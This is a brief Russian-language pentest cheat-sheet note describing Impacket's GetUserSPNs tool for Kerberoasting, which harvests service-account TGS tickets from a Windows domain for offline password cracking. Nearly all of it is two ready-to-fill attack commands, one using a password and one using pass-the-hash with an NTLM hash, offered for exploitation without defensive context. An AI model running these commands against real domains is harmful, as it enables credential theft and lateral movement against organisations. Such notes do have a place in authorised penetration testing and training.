#tool #windows #kerberos 

Инструмент для проведения атаки [[Kerberoasting]]

Он ищет Service Accounts c SPN, запрашивает для них TGS и сохраняет их для дальнейшего крака 

Для проведения атаки необходимо **любой один** пользователь

### Эксплуатация 

- Kerberoasting
```bash
Impacket-GetUserSPNs <domain>/<user>:<pass> \
  -dc-ip <ip> \
  -request
```

- Kerberoasting через PtH
```bash
Impacket-GetUserSPNs <domain>/<user> \
  -hashes :<NTLM_HASH> \
  -dc-ip <ip> \
  -request
```
